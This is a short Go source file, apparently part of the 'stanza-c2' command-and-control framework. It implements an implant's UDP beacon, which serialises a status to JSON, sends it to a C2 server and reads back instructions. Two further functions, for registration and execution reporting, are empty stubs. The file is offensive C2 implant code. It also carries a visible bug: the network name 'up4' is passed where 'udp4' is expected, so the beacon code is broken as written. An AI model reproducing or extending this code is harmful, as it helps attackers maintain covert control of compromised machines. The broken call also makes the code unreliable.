package main

import (
	"encoding/json"
	"net"

	"github.com/jmpsec/stanza-c2/pkg/types"
)

// Function to send a beacon to the C2 using UDP socket and IPv4
func sendUDPv4Beacon(service string, data types.StzBeaconStatus) (types.StzBeaconResponse, error) {
	// Resolve service
	udpAddr, err := net.ResolveUDPAddr("up4", service)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Attempt UDP connection
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Serialize data
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Send data
	_, err = conn.Write(jsonOut)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Get response
	var buf [1024]byte
	n, err := conn.Read(buf[0:])
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Parse response
	var rData types.StzBeaconResponse
	err = json.Unmarshal(buf[0:n], &rData)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Return response
	return rData, nil
}

// Function to register a client in the C2 using UDP socket and IPv4
func registerUDPv4Client() error {
	return nil
}

// Function to send an execution status to the C2 using UDP socket and IPv4
func sendUDPv4Execution() error {
	return nil
}
